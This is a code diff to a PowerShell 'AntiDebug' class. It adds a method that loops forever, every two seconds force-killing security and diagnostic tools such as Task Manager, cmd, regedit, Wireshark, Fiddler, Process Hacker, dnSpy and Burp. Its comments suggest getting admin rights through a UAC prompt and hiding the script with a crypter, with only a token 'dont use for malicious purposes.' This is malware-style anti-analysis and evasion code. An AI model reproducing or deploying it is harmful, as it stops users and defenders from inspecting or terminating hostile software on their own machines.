@@ -71,7 +71,25 @@ class AntiDebug {
             Write-Host "[+] Passed Disk Drive Model Check" -ForegroundColor Green
         }
 
+        $this.antidebugproccess()
         Read-Host "Press Enter to exit"
+    }
+
+    [void] antidebugproccess() {
+        $2kill = @('cmd', 'taskmgr', 'process', 'processhacker', 'ksdumper', 'fiddler', 'httpdebuggerui', 'wireshark', 'httpanalyzerv7', 'fiddler', 'decoder', 'regedit', 'procexp', 'dnspy', 'vboxservice', 'burpsuit', 'DbgX.Shell', 'ILSpy')
+        # Loop btw 
+        # i would like to mention trying kill taskmanger wont work until UAC Permissions (ADMIN), you can make uac prompt, and if person choses no then make it dont run
+        # dont use for malicious purpoeses. if you do use crypter like from Chainski on github (AES ENCODER).
+        while ($true) {
+            foreach ($prg in $2kill) {
+                $rprc = Get-Process -Name $prg -ErrorAction SilentlyContinue
+                if ($rprc) {
+                    Stop-Process -Name $prg -Force 
+                    Write-Host "[+] Closed process: $prg" -ForegroundColor Yellow
+                }
+            }
+            Start-Sleep -Seconds 2
+        }
     }
 }
 
